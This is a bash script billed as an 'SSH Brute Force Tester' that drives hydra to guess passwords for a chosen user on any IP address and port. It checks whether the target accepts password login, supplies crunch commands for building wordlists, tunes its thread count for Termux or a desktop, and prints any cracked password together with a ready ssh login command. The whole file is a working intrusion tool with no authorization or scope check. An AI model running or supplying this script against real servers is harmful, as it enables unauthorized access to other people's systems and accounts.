#!/bin/bash
# SSH Brute Force Tester v2.2
# Usage: ./ssh-brute.sh <ip> <user> [wordlist] [port]

IP="${1:?Usage: $0 <ip> <user> [wordlist] [port]}"
USER="${2:?Usage: $0 <ip> <user> [wordlist] [port]}"
WORDLIST="${3:-}"
PORT="${4:-22}"
LOG="${TMPDIR:-/tmp}/ssh-brute-$(date +%Y%m%d-%H%M%S).log"
TIMEOUT=300

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log() { echo -e "$1" | tee -a "$LOG"; }
strip_ansi() { echo "$1" | sed 's/\x1b\[[0-9;]*m//g'; }

log "${YELLOW}=== SSH Brute Force Tester v2.2 ===${NC}"
log "Target: ${RED}$IP:$PORT${NC}"
log "User:   ${RED}$USER${NC}"
log "Log:    $LOG"
log ""

# === Pre-checks ===
if ! command -v hydra &>/dev/null; then
    log "${RED}[!] hydra not installed${NC}"
    log "${RED}    Ubuntu: sudo apt install hydra -y${NC}"
    log "${RED}    Termux: pkg install hydra -y${NC}"
    exit 1
fi

if ! command -v ssh &>/dev/null; then
    log "${RED}[!] ssh not installed${NC}"
    exit 1
fi

# === Wordlist selection ===
SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "$0" 2>/dev/null || echo "$0")")" && pwd)"
BUILTIN_BIG="$SCRIPT_DIR/wordlist.txt"

if [ -n "$WORDLIST" ]; then
    if [ ! -f "$WORDLIST" ]; then
        log "${RED}[!] Wordlist not found: $WORDLIST${NC}"
        exit 1
    fi
    if [ ! -s "$WORDLIST" ]; then
        log "${RED}[!] Wordlist is empty: $WORDLIST${NC}"
        exit 1
    fi
    log "${GREEN}[*] Custom wordlist: $WORDLIST${NC}"
elif [ -f "$BUILTIN_BIG" ] && [ -s "$BUILTIN_BIG" ]; then
    WORDLIST="$BUILTIN_BIG"
    log "${GREEN}[*] Using built-in wordlist ($BUILTIN_BIG)${NC}"
else
    log "${RED}[!] No wordlist found. Generate one:${NC}"
    log "${RED}    crunch 6 8 abcdefghijklmnopqrstuvwxyz1234567890 -o wordlist.txt${NC}"
    exit 1
fi

# === Check password auth ===
log "${YELLOW}[1/3] Checking password auth on port $PORT...${NC}"
SSH_OUTPUT=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
    -o PreferredAuthentications=none -p "$PORT" "$USER@$IP" 2>&1) || true

if [[ "$SSH_OUTPUT" == *"publickey"* ]]; then
    log "${RED}[!] Target only accepts SSH keys - brute force impossible${NC}"
    exit 1
elif [[ "$SSH_OUTPUT" == *"Connection refused"* ]]; then
    log "${RED}[!] Connection refused on port $PORT${NC}"
    exit 1
elif [[ "$SSH_OUTPUT" == *"Connection timed out"* ]]; then
    log "${RED}[!] Connection timed out on port $PORT${NC}"
    exit 1
elif [[ "$SSH_OUTPUT" == *"No route to host"* ]]; then
    log "${RED}[!] No route to host${NC}"
    exit 1
elif [[ "$SSH_OUTPUT" == *"Network is unreachable"* ]]; then
    log "${RED}[!] Network unreachable${NC}"
    exit 1
elif [[ "$SSH_OUTPUT" == *"Permission denied"* ]]; then
    log "${GREEN}[+] Password auth supported!${NC}"
else
    log "${YELLOW}[?] Unknown response, trying anyway...${NC}"
    log "${YELLOW}[?] SSH: $SSH_OUTPUT${NC}"
fi

# === Attack ===
COUNT=$(wc -l < "$WORDLIST" | tr -d ' ')
if [ "$COUNT" -eq 0 ]; then
    log "${RED}[!] Wordlist is empty after reading${NC}"
    exit 1
fi

log "${YELLOW}[2/3] Wordlist: $COUNT passwords${NC}"
log "${YELLOW}[3/3] Starting brute force (timeout ${TIMEOUT}s)...${NC}"
log ""

# Auto-detect thread count (Termux = 2, desktop = 4)
if [ -d "/data/data/com.termux" ]; then
    THREADS=2
else
    THREADS=4
fi

FOUND_LINE=""
HYDRA_EXIT=0

while IFS= read -r line; do
    # Bash string matching instead of spawning grep subprocess
    if [[ "$line" == *"host:"* ]]; then
        FOUND_LINE="$line"
        log ""
        log "${GREEN}╔════════════════════════════════════════════╗${NC}"
        log "${GREEN}║  PASSWORD FOUND!                           ║${NC}"
        log "${GREEN}╚════════════════════════════════════════════╝${NC}"
        log "${GREEN}[FOUND] $line${NC}"
        log "${GREEN}[CMD]   ssh -p $PORT $USER@$IP${NC}"
        # Strip ANSI for clean log
        strip_ansi "$line" >> "$LOG.clean"
    elif [[ "$line" == *"[ATTEMPT]"* ]]; then
        attempt=$(echo "$line" | sed -n 's/.*login: //p')
        printf "${CYAN}[*] Trying: %s\033[K\r${NC}" "$attempt"
    elif [[ "$line" == *"ERROR"* ]]; then
        log "${RED}[ERR] $line${NC}"
    fi
    # Log raw output (stripped of ANSI) for clean file
    strip_ansi "$line" >> "$LOG.raw"
done < <(timeout "$TIMEOUT" hydra -l "$USER" -P "$WORDLIST" -t "$THREADS" -f -V -s "$PORT" "$IP" ssh 2>&1) || HYDRA_EXIT=$?

log ""
log ""

# === Results ===
if [ $HYDRA_EXIT -eq 124 ]; then
    log "${RED}[!] Timed out after ${TIMEOUT} seconds${NC}"
elif [ -n "$FOUND_LINE" ]; then
    log "${GREEN}[+] SSH: ssh -p $PORT $USER@$IP${NC}"
elif [ $HYDRA_EXIT -eq 0 ] || [ $HYDRA_EXIT -eq 1 ]; then
    log "${YELLOW}[-] No password found in wordlist ($COUNT tried)${NC}"
    log "${YELLOW}[-] Try bigger wordlist:${NC}"
    log "${YELLOW}    crunch 8 8 abcdefghijklmnopqrstuvwxyz1234567890 -o big.txt${NC}"
    log "${YELLOW}    ./ssh-brute.sh $IP $USER big.txt $PORT${NC}"
else
    log "${RED}[!] Hydra exited with code $HYDRA_EXIT${NC}"
fi

log "${YELLOW}=== Scan Complete ===${NC}"
log "Log: $LOG"
log "Clean log: $LOG.clean"
log "Raw log: $LOG.raw"
